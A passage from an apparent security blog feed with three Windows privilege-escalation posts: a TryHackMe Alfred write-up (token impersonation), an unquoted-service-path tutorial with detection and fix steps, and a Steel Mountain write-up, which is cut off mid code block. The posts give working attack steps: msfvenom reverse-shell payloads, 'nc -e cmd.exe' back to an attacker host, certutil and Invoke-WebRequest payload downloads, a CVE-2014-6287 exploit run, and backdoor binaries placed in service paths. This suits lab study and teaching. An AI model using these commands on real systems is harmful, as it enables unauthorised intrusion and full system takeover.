- [Primary tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly): An access token that is typically created 
only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.
- [Impersonation tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly): An access token that has been created 
to capture the security information of a client process, allowing a server to &quot;impersonate&quot; the client 
process in security operations. It becomes convenient when you are the local admin on a system and want to
impersonate another logged on client, e.g. a domain admin.
&lt;br&gt;&lt;br&gt;There are four levels for impersonation token:
    - **SecurityAnonymous**: current user/account/client cannot impersonate another user/account/client.
    - **SecurityIdentification**: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.
    - **SecurityImpersonation**: current user/account/client can impersonate user&apos;s security context on the local system.
    - **SecurityDelegation**: current user/account/client can impersonate user&apos;s security context on a remote system.

The security context is a data structure that stores clients&apos; security information.

### Diffrence between proceesses hierarchy in UNIX and Windows
### unix
In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
inherits all the permissions from its&apos; parent. If the parent dies, the child becomes an [orphan or zombie process](https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/).

### windows

The parent-child relationship does not exist for the Windows environment. 
However, I will refer to them as parent-child to facilitate the explanation.
Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
token of its&apos; parent which is created by **LSASS.exe** on logon. However, windows treats all processes as belonging to the 
same generation. 

#### what is the LSASS.exe ?
LSASS.exe, **Local Security Authority Process**, is responsible for authenticating accounts
in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
authenticates, lsass.exe generates a **user access token**, which is then used to launch the initial shell. **Other processes that
the account initiates inherit from this token**.

### commons
Both Windows and UNIX processes inherit the security settings of the creating process by default.
Signals, Exceptions, and Events.


# PRIVILEGE ESCALATION

After gaining the initial access to the target machine, the first step will be to check the account&apos;s permissions on the system.

&lt;br&gt;Run: **whoami /priv**
{% highlight powershell %}

C:\Program Files (x86)\Jenkins\workspace\project&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled &lt;--
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled &lt;--
SeCreateGlobalPrivilege         Create global objects                     Enabled &lt;--
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

{% endhighlight %}

Those are the privileges of the current user which are inherited from a group or given to the account when created. 
However, only three of them stated as _Enabled_.
&lt;br&gt;&lt;br&gt;[Here](https://github.com/gtworek/Priv2Admin) is the full list of exploitable privileges.
&lt;br&gt;And [here](https://www.exploit-db.com/papers/42556) is the detailed documentation of abusing token privileges.
&lt;br&gt;Also a great video resource [here](https://www.youtube.com/watch?v=QRpfvmMbDMg) about token handling vulnerabilities.

We will need a module called [incognito](https://labs.f-secure.com/archive/incognito-v2-0-released/).
Therefore I will use **Metasploit Framework** while it has the incognito module built-in.

The one I will be exploiting is the **SeImpersonatePrivilege**.
Follow these steps to get [NT AUTHORITY\SYSTEM](https://superuser.com/questions/471769/what-is-the-nt-authority-system-user) privileges.
- Create a meterpreter reverse shell binary.
{% highlight bash %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT}-f exe -o ashell.exe
{% endhighlight %}
- Upload the executable to the target machine.
- Start a reverse tcp listener with metasploit:
{% highlight bash %}
msfconsole -q
msf6 use exploit exploit/multi/handler
msf6 set payload windows/meterpreter/reverse_tcp
msf6 set LHOST {THM IM}
msf6 set LPORT {THE PORT DECLARED FOR EXECUTABLE BEFORE}
msf6 run
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png)&lt;br&gt;
- After successfully receiving the meterpreter console, load the incognito module.
&lt;br&gt;Run:
{% highlight bash %}
msf6 load incognito
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png)&lt;br&gt;
Then, list all the available tokens:
{% highlight bash %}
list_tokens -g
{% endhighlight %}
There will be a delegation token called &quot;BULTIN\Administrators&quot;. We will impersonate that token.
Delegation and impersonation levels are identical locally.
- Run:
{% highlight bash %}
impersonate_token &quot;BUILTIN\Administrators&quot;
{% endhighlight %}
If everything were successfully done, **NT AUTHORITY\SYSTEM** should be the output of the **getuid** command.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png)
- Run **ps** to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.

![](/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png)&lt;br&gt;
By doing that, we have camouflaged our malicious process into a safer looking one.
&lt;br&gt;![](/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png)&lt;br&gt;
&lt;br&gt;To get the root flag, run:
{% highlight bash %}
cat &quot;C:\Windows\system32\config\root.txt&quot;
{% endhighlight %}
&lt;br&gt;
</description>
        <pubDate>Tue, 28 Dec 2021 08:40:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>metasploit</category>
        
        <category>mindows-privesc</category>
        
        <category>windows-tokens</category>
        
        <category>bruteforce</category>
        
        <category>remote-code-execution</category>
        
        <category>jenkins</category>
        
        
      </item>
    
      <item>
        <title>Unquoted Service Path Vulnerability</title>
        <description># What is Unquoted Service Path ?

**Unquoted Service Path** is a vulnerability that occurs when a service is created with a **service path** without appropriate
quoting surrounding the path string, and if the path contains spaces, that can end up with a **privilege escalation** with the
permissions of whoever created the service. 

# How it works?

Typically [**Service Control Manager**](https://en.wikipedia.org/wiki/Service_Control_Manager) will run the service&apos;s executable
by looking at its full path.
- Path of the safe service -&gt; &quot;C:\Program Files\a folder\b folder\c folder\vulnservice.exe&quot;

The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. 
&lt;br&gt;Basically, the system will interpret the path as a full string. 
&lt;br&gt;
&lt;br&gt;
However, if the full path of the service file is not enclosed within quotation marks just like the following example, things are
getting tricky:
- Path of the vulnerable service -&gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe

This time, for each space in the path, the system will append the **.exe** extension at the end of the most recent 
space. Thus the first string chunk of the folder name will be treated as an executable.
&lt;br&gt;Interpretation would be as following:

1. C:\\**Program.exe**
2. C:\Program Files\\**a.exe** : If Progam.exe does not exist, execute a.exe
3. C:\Program Files\a folder\\**b.exe** : If a.exe does not exist, execute b.exe
4. C:\Program Files\a folder\b folder\\**c.exe** : If b.exe does not exist, execute c.exe
5. C:\Program Files\a folder\b folder\c folder\\**vulnservice.exe** : If c.exe does not exist, execute vulnservice.exe

# How to exploit it ?

Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission
for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the 
first string chunk of its child folder.

&lt;br&gt;Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware 
named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.

# Setting the Lab 

In order to exploit the vulnerability, we need to create one.
&lt;br&gt;

Open up the start menu, and launch a command prompt by running it as an administrator.
&lt;br&gt;![](/assets/img/posts/unquoted-service-path-vulnerability/1.jpg)&lt;br&gt;&lt;br&gt;


Create a low privileged user:
`net user krygen krygen /add`
![](/assets/img/posts/unquoted-service-path-vulnerability/2.jpg)&lt;br&gt;&lt;br&gt;
Press **Win+R**, and run **lusrmgr.src**, to see all users and groups in the system.
&lt;br&gt;You can see the user krygen has been created successfully.
&lt;br&gt;It is also possbile to run &apos;**net user krygen**&apos; to get same information from the command line.
![](/assets/img/posts/unquoted-service-path-vulnerability/3.jpg)&lt;br&gt;&lt;br&gt;
And the account belongs to the **Users Group**.
![](/assets/img/posts/unquoted-service-path-vulnerability/4.jpg)&lt;br&gt;&lt;br&gt;
To create a vulnerable service run this command:
{% highlight powershell %}
sc create &quot;Vuln Service&quot; binpath=
&quot;C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe&quot; Displayname= &quot;Vulnerable Service&quot; start= auto
{% endhighlight %}
- sc.exe is the utility to create and interact with the services.
- binpath is the path of the binary executable of the service.
- Displayname is not mandatory, if you leave it blank, it will take the name of the service.
- start is the start type, it can be either auto or manual.

![](/assets/img/posts/unquoted-service-path-vulnerability/5.jpg)&lt;br&gt;&lt;br&gt;
&lt;br&gt; We can see the details of any service by runnig &apos;**sc qc {SERVICE NAME}**&apos;.
&lt;br&gt;Important fields to notice:
- START_TYPE = AUTO_START -&gt; Service will start automatically when the sytem boots.
- SERVICE_START_NAME = LocalSystem -&gt; Service will start with the LocalSystem service account privileges.

[**LocalSystem**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN) is a 
service account, and it has the highest privileges of the system, which is the system root.
&lt;br&gt; Read more about [**Microsoft Service Accounts**](https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco).
![](/assets/img/posts/unquoted-service-path-vulnerability/6.jpg)&lt;br&gt;&lt;br&gt;
Let create directories which is declared as a path for our service.
{% highlight powershell %}
mkdir &quot;C:\Program Files\a folder\b folder\c folder&quot;
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/7.jpg)&lt;br&gt;&lt;br&gt;
As you can see, it is not possible to start the service since the there is no executable in path.
![](/assets/img/posts/unquoted-service-path-vulnerability/8.jpg)&lt;br&gt;&lt;br&gt;

I will create two executables, both will delete different txt files from a specified path.
&lt;br&gt;One will delete **burak.txt** and the other, **krygen.txt**, for every 3 seconds.
![](/assets/img/posts/unquoted-service-path-vulnerability/9.jpg)_Source code for vulnservice.exe_&lt;br&gt;&lt;br&gt;
![](/assets/img/posts/unquoted-service-path-vulnerability/10.jpg)_Source code for b.exe_&lt;br&gt;&lt;br&gt;
I have compiled both C codes with GCC and converted them into executables.
&lt;br&gt;[**Download gcc compiler**](https://sourceforge.net/projects/gcc-win64/)
![](/assets/img/posts/unquoted-service-path-vulnerability/11.jpg)&lt;br&gt;&lt;br&gt;

Put the **vulnservice.exe** into the **c folder**. When I start the service manually, starting from **C:\\**, the system will 
try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will 
be executed as expected behaviour.
&lt;br&gt;&lt;br&gt;
Let run the service:
{% highlight powershell %}
sc start &quot;Vuln Service&quot;
{% endhighlight %}

![](/assets/img/posts/unquoted-service-path-vulnerability/12.jpg)_First run: 0th second_&lt;br&gt;&lt;br&gt;
![](/assets/img/posts/unquoted-service-path-vulnerability/13.jpg)_3rd second_&lt;br&gt;&lt;br&gt;

Now put b.exe in a folder, then start the service again.
&lt;br&gt;Remember the execution the we have discussed at the beginning.
![](/assets/img/posts/unquoted-service-path-vulnerability/14.jpg)_First run: 0th second_&lt;br&gt;&lt;br&gt;
As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,
but it was what we were expecting.
![](/assets/img/posts/unquoted-service-path-vulnerability/15.jpg)_3rd second_

# Exploitation

We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service 
manually and write any of the subdirectories of the service path.
&lt;br&gt;As the name suggests **privilege escalation**, is about raising our permissions to the LocalSystem/root permissions from
a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.
&lt;br&gt;&lt;br&gt;
Let&apos;s check the the [**ACL(Access Control List)**](https://networkencyclopedia.com/access-control-list-acl/) of the &apos;C:\Program Files\a folder&apos; with [**icacls**](https://www.techtarget.com/searchwindowsserver/definition/icacls). 
&lt;br&gt;&lt;br&gt;Run:
{% highlight powershell %}
icacls &quot;C:\Program Files\a folder&quot;
{% endhighlight %}

&lt;br&gt;The Users Group entry, **BUILTIN\\Users:(I)(RX)**, gives access **read** and **execute** permissions 
for every user who belongs to **Users Group**. The **krygen** user we have created at the beginning of the 
post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the **write** 
permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use **a folder**.
&lt;br&gt;Read more about [Security Descriptors](https://networkencyclopedia.com/discretionary-access-control-list-dacl/) and
[DACL](https://networkencyclopedia.com/discretionary-access-control-list-dacl/)
![](/assets/img/posts/unquoted-service-path-vulnerability/16.jpg)&lt;br&gt;&lt;br&gt;

Let us grant write access to Users Group for **a folder**.
&lt;br&gt;&lt;br&gt;Run:
{% highlight powershell %}
icacls &quot;C:\Program Files\a folder&quot; /grant &quot;BUILTIN\Users&quot;:W
{% endhighlight %}
Then run:
{% highlight powershell %}
icacls &quot;C:\Program Files\a folder&quot;
{% endhighlight %}
This time you will see a new entry **BUILTIN\\Users:(W)**
&lt;br&gt;&lt;br&gt;Now the user we have created, krygen, can write to that specific directory.
![](/assets/img/posts/unquoted-service-path-vulnerability/17.jpg)&lt;br&gt;&lt;br&gt;

Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.
&lt;br&gt;We will assume that, somehow you have gained accessed to the system as the user krygen.
&lt;br&gt;I will use [**netcat**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe)
in order to establish a connection and take a shell from krygen to my attacker machine.
&lt;br&gt;&lt;br&gt;Run this on the attacker machine: 
{% highlight powershell %}
nc -nvlp {SOME FREE PORT}
{% endhighlight %}
Run that on the windows machine: 
{% highlight powershell %}
nc -e cmd.exe {IP OF THE ATTACKER MACHINE} {PORT THE ATTACKER MACHINE LISTENS TO}
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/18.jpg)&lt;br&gt;&lt;br&gt;
Now that we have access to the krygen&apos;s shell, we can try to write to all those a,b and c folders by attempting to create a 
new folder in each of them to test which one of them is accessible. We already know it is **a folder**, no harm double-checking.

![](/assets/img/posts/unquoted-service-path-vulnerability/19.jpg)_Folder creation is successfull inside &apos;a folder&apos;_&lt;br&gt;&lt;br&gt;
![](/assets/img/posts/unquoted-service-path-vulnerability/20.jpg)_Failed to create folder inside &apos;b folder&apos;_&lt;br&gt;&lt;br&gt;
![](/assets/img/posts/unquoted-service-path-vulnerability/21.jpg)_Failed to create folder inside &apos;c folder&apos;_&lt;br&gt;&lt;br&gt;

Since the directory that we can write is the **a folder**, if we want the service to execute our binary executable
instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is
**b**.exe.
&lt;br&gt;
I am going to use [**msfvenom**](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/) to create a reverse shell
binary back to my machine.

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|LHOST                   | The IP address that the reverse shell will connect     |
|LPORT                   | The port that the reverse shell will connect           |
|-p                      | Payload to use                                         |
|-o                      | Name of the file                                       |
|-f                      | File type of the output binary                         |

![](/assets/img/posts/unquoted-service-path-vulnerability/22.jpg)&lt;br&gt;&lt;br&gt;

Now we need to download the executable to the victim machine.
&lt;br&gt;Run this in the directory that your executable locates. It will start a web server inside of that directory.
{% highlight bash %}
python -m http.server 80
{% endhighlight %}


![](/assets/img/posts/unquoted-service-path-vulnerability/23.jpg)&lt;br&gt;&lt;br&gt;
&lt;br&gt;You can download any file from the running python server by using one of these utilites.

{% highlight powershell %}
powershell -c &quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;
{% endhighlight %}

{% highlight powershell %}
certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}
{% endhighlight %}

Double-check to see if the executable downloaded successfully into the directory to which you have the write access.

![](/assets/img/posts/unquoted-service-path-vulnerability/24.jpg)&lt;br&gt;&lt;br&gt;
Start a **netcat** listener on the port you declared in the reverse shell binary.

![](/assets/img/posts/unquoted-service-path-vulnerability/25.jpg)&lt;br&gt;&lt;br&gt;

Since we do not have **LocalSystem** permissions, it is impossible to start the service manually. However, the start type of the 
service is **AUTO_START**. Thus the service will be initialized at the system boot. All we have to do is reboot the system
and wait for the connection to establish.
&lt;br&gt;Run:
{% highlight powershell %}
sutdown /r /t 0
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/27.jpg)&lt;br&gt;&lt;br&gt;

Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.
The path we are in is **system32**, which means we have the console with administrator rights, 
have fun after that point :))).
![](/assets/img/posts/unquoted-service-path-vulnerability/28.jpg)&lt;br&gt;&lt;br&gt;

# How to fix it ?

First of all, run this to see if there is any service with an unquoted path variable.:
{% highlight powershell %}
wmic service get name,pathname,displayname,startmode | findstr /i auto |
findstr /i /v &quot;C:\Windows\&quot; | findstr /i /v &quot;&quot;&quot;
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/29.jpg)&lt;br&gt;&lt;br&gt;

If there is, then press **Win+R** and type **regedit.exe**, press enter.
&lt;br&gt;In the directory tree, search for the vulnerable service name under:&lt;br&gt; **Computer\\HKEY_LOCAL_MACHINE\\SYSTEM
\\ControlSet\\Services\\{SERVICE NAME}**.
![](/assets/img/posts/unquoted-service-path-vulnerability/31.jpg)&lt;br&gt;&lt;br&gt;

Find the **ImagePath** entry, double click it.
![](/assets/img/posts/unquoted-service-path-vulnerability/32.jpg)&lt;br&gt;&lt;br&gt;

Change its value by surrounding the string with quotes.
![](/assets/img/posts/unquoted-service-path-vulnerability/33.jpg)&lt;br&gt;&lt;br&gt;

Run again, this time you should not see any results, you have fixed it:
{% highlight powershell %}
wmic service get name,pathname,displayname,startmode | findstr /i auto |
findstr /i /v &quot;C:\Windows\&quot; | findstr /i /v &quot;&quot;&quot;
{% endhighlight %}

# How to prevent it ?

How on the world I can create a safe service ?
&lt;br&gt; Simple, when creating a service with `sc.exe`, do not pass the parameter for **binpath** like this:
{% highlight powershell %}
binpath= &quot;C:\Program Files\a folder\b folder\c folder&quot;
{% endhighlight %}

Instead, do it like this:
{% highlight powershell %}
binpath= &quot;\&quot;C:\Program Files\a folder\b folder\c folder&quot;\&quot;
{% endhighlight %}


Enjoy your safely created service.
![](/assets/img/posts/unquoted-service-path-vulnerability/35.jpg)&lt;br&gt;&lt;br&gt;
</description>
        <pubDate>Thu, 23 Dec 2021 00:59:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</guid>
        
        <category>windows-privesc</category>
        
        <category>unqoted-service-path</category>
        
        <category>windows</category>
        
        <category>pentesting</category>
        
        
      </item>
    
      <item>
        <title>THM Steel Mountain CTF Writeup</title>
        <description>[**Solve Yourself &gt;&gt;**](https://tryhackme.com/room/steelmountain)

The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
vulnerabilities that occur on the system.

# FIRST METHOD
## 1-Preperation
Export the ip address of the machine as a variable for shorthand usage.
&lt;br&gt;-&gt; export ip={MACHINE IP}
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg){:.normal}

## 2-Enumeration 
Let us run Network Mapper (**nmap**) to discover opened ports and services.   

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Full command: 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg){:.normal}&lt;br&gt;&lt;br&gt;
There is a web server running on port **80**, let us visit.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg){:.normal}&lt;br&gt;&lt;br&gt;
There is also one more web server is running at port **8080**
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg){:.normal}&lt;br&gt;&lt;br&gt;
If you click on the **HttpFileServer2.3** link under the **Server Information** heading, it will redirect you to the following page.
It seems the HTTP server is being run by **rejetto**.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg){:.normal}&lt;br&gt;&lt;br&gt;
There is a vulnerablity on the **Rejetto HFS versions 2.3, 2.3a, and 2.3b**, let&apos;s check.&lt;br&gt;
[**CVE-Database -&gt; Rejetto HFS 2.3**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287)
&lt;br&gt;[**More detailed explaination**](https://www.kb.cert.org/vuls/id/251276)
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg){:.normal}&lt;br&gt;&lt;br&gt;

## 3-Exploitation

### Gaining Access to the System - Getting User Flag
Launch up your **msfconsole** and do a search for **CVE-2014-6287** to see if there is any exploit that we can use.
There is one with an excellent rank, awesome! Let us use it.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg){:.normal}&lt;br&gt;&lt;br&gt;
Copy the THM IP with that command:
{% highlight bash %}
ifconfig | grep -C 1 tun0 | tail -n 1 | awk &apos;{print $2}&apos;
{% endhighlight %}
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg){:.normal}&lt;br&gt;&lt;br&gt;
-&gt; set RPORT **8080**&lt;br&gt;-&gt; set RHOST **machine IP**&lt;br&gt;-&gt; set LHOST **your THM IP**&lt;br&gt;-&gt; exploit

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|RPORT                   | The target port (TCP)                                  |
|RHOST                   | Address of the target                                  |
|LPORT                   | The listen port                                        |

![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg){:.normal}&lt;br&gt;&lt;br&gt;
After receiving meterpreter session, run **shell** to get an interactive shell.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg){:.normal}&lt;br&gt;&lt;br&gt;
Find the flag under **C:\users\bill\Desktop** directory.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg){:.normal}&lt;br&gt;&lt;br&gt;

### Escalate the privileges - Getting the Root flag

After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
&lt;br&gt;-&gt; [**Download PowerUp.ps1**](https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
&lt;br&gt;-&gt; [**PowerSploit GitHub Repo**](https://github.com/PowerShellMafia/PowerSploit)
&lt;br&gt;-&gt; Run **exit** and get back to the **meterpreter** session.
&lt;br&gt;-&gt; Upload the script just as we did before to the machine.
&lt;br&gt;-&gt; Run **load powershell**
&lt;br&gt;-&gt; Run **powershell_shell**
&lt;br&gt;You will get **PowerShell** this time instead of a regular **cmd prompt**.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg){:.normal}&lt;br&gt;&lt;br&gt;
&lt;br&gt;-&gt; Run **. .\PowerUp.ps1**
&lt;br&gt;-&gt; Run **Invoke-AllChecks**
&lt;br&gt;**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
&lt;br&gt;&lt;br&gt;The first result we got is a service called **AdvancedSystemCare9**, and it has a vulnerability called 
**Unquoted Service Path** [**-&gt; Read more about it**](https://www.bbsec.net/2021/12/23/unquoted-service-path-vulnerability/). We will abuse this vulnerability. 
&lt;br&gt;**CanRestart** field means that the current user, in this case, **bill**, can manually restart the service even though
the service itself is being run with **LocalSystem** service account permissions, which has the top-level privileges.
&lt;br&gt;[**LocalSystem Service Account**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN)
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg){:.normal}&lt;br&gt;&lt;br&gt;

Launch up **msfvenom** to deploy a reverse shell binary. 

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|LHOST                   | The IP address that the reverse shell will connect     |
|LPORT                   | The port that the reverse shell will connect           |
|-p                      | Payload to use                                         |
|-o                      | Name of the file                                       |
|-f                      | File type of the output binary                         |

Full command:
{% highlight bash %}
msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe
{% endhighlight %}
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg){:.normal}&lt;br&gt;&lt;br&gt;

-&gt; Upload the binary to the target machine.
&lt;br&gt;-&gt; Get the **shell** again.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg){:.normal}&lt;br&gt;&lt;br&gt;

-&gt; Relocate the binary into **C:\Program Files (x86)\IObit** directory.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg){:.normal}&lt;br&gt;&lt;br&gt;

-&gt; Rename the binary to **Advanced.exe**.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg){:.normal}&lt;br&gt;&lt;br&gt;

Start a **netcat** listener on your machine with the port that is defined when creating
the backdoor.
{% highlight powershell %}
nc -nvlp {SPECIFIED PORT}
{% endhighlight %}
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg){:.normal}&lt;br&gt;&lt;br&gt;

After starting a netcat session, restart the service
{% highlight powershell %}
sc stop AdvancedSystemCareService9
{% endhighlight %}
{% highlight powershell %}
sc start AdvancedSystemCareService9
{% endhighlight %}
&lt;br&gt;When the service boots, **Advanced.exe** backdoor binary will be executed instead of the **ASCService.exe**. 
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg){:.normal}&lt;br&gt;&lt;br&gt;
You can find the root flag **root.txt** under **C:\Users\Administrator\Desktop** directory.

# SECOND METHOD

In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.

## 1-Preperation
&lt;br&gt;-&gt; Copy **Advanced.exe** or create a new backdoor executable with **msfvenom** just like before.
&lt;br&gt;-&gt; Download [**winPEAS.bat**](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat)
&lt;br&gt;-&gt; Download static binary [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe)
&lt;br&gt;-&gt; Download [**PowerUp.ps1**](https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1) or use the previous one if you downloaded it before.
&lt;br&gt;-&gt; Download [**CVE-2014-6287.py**](https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py) or from [**Exploitdb**](https://www.exploit-db.com/exploits/39161)
&lt;br&gt;&lt;br&gt;Your directory should look like this
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg){:.normal}&lt;br&gt;&lt;br&gt;
## 2-Exploitation
Edit the **cve20146287.py** file, set the **ip_addr** field to your THM IP, and set the **local_port** to any free port.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg){:.normal}&lt;br&gt;&lt;br&gt;

Start a **netcat** listener on the port you declared in the **python** file.
&lt;br&gt;Run it twice. At first run the server will download **nc.exe** static binary from your server. At second, it will run
**nc.exe** to connect to your local machine by providing a CMD prompt.
&lt;br&gt;![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg){:.normal}&lt;br&gt;&lt;br&gt;

&lt;br&gt;It is possible to use PowerUp.ps1 again or **winPEAS.bat** can be used to enumerate misconfigurations.
&lt;br&gt;You can download any file from the running python server by using one of these utilites.

{% highlight powershell %}
powershell -c &quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;
{% endhighlight %}

{% highlight powershell %}
